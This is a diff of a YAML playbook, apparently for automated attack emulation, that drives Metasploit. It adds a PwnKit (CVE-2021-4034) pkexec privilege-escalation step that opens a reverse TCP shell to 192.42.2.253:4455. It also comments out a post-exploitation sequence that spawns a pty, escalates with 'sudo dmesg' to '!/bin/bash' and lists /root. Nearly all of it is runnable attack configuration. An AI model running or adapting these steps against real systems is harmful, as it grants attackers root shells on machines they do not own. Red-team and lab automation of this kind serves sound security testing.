@@ -21,52 +21,70 @@ commands:
 
       #  - type: sleep
       #    seconds: 60
+  - type: msf-module
+    cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+    auto_session: True
+    options:
+      WRITABLE_DIR: "/tmp"
+    payload_options:
+      LHOST: 192.42.2.253
+      LPORT: 4455
+    payload: linux/x64/shell/reverse_tcp
 
-  - type: msf-session
-    stdapi: True
-    cmd: sysinfo
+  - type: sleep
+    seconds: 60
 
-  - type: msf-session
-    cmd: shell
-
-  - type: msf-session
-    cmd: id
-
-  - type: msf-session
-    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
-
-  - type: msf-session
-    cmd: export SHELL=bash
-
-  - type: msf-session
-    cmd: export TERM=xterm256-color
-
-  - type: msf-session
-    cmd: stty rows 38 columns 116
-
-  - type: msf-session
-    cmd: sudo -l
-
-  - type: msf-session
-    write: True
-    cmd: "sudo dmesg -H"
+      #  - type: msf-session
+      #    stdapi: True
+      #    cmd: sysinfo
+      #
+      #  - type: msf-session
+      #    stdapi: True
+      #    cmd: getuid
+      #
+      #  - type: msf-session
+      #    cmd: shell
 
   - type: msf-session
     write: True
-    cmd: "!/bin/bash\r\n"
-
-  - type: msf-session
     cmd: id
 
   - type: msf-session
-    cmd: ls -l /root
+    read: True
+    cmd: id
 
-  - type: msf-session
-    cmd: exit
 
-  - type: msf-session
-    cmd: exit
-
+      #  - type: msf-session
+      #    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+      #
+      #  - type: msf-session
+      #    cmd: export SHELL=bash
+      #
+      #  - type: msf-session
+      #    cmd: export TERM=xterm256-color
+      #
+      #  - type: msf-session
+      #    cmd: stty rows 38 columns 116
+      #
+      #  - type: msf-session
+      #    cmd: sudo -l
+      #
+      #  - type: msf-session
+      #    write: True
+      #    cmd: "sudo dmesg -H"
+      #
+      #  - type: msf-session
+      #    write: True
+      #    cmd: "!/bin/bash\r\n"
+      #
+      #  - type: msf-session
+      #    cmd: id
+      #
+      #  - type: msf-session
+      #    cmd: ls -l /root
+      #
+      #  - type: msf-session
+      #    cmd: exit
 
       #  - type: msf-module
       #    cmd: auxiliary/scanner/portscan/tcp
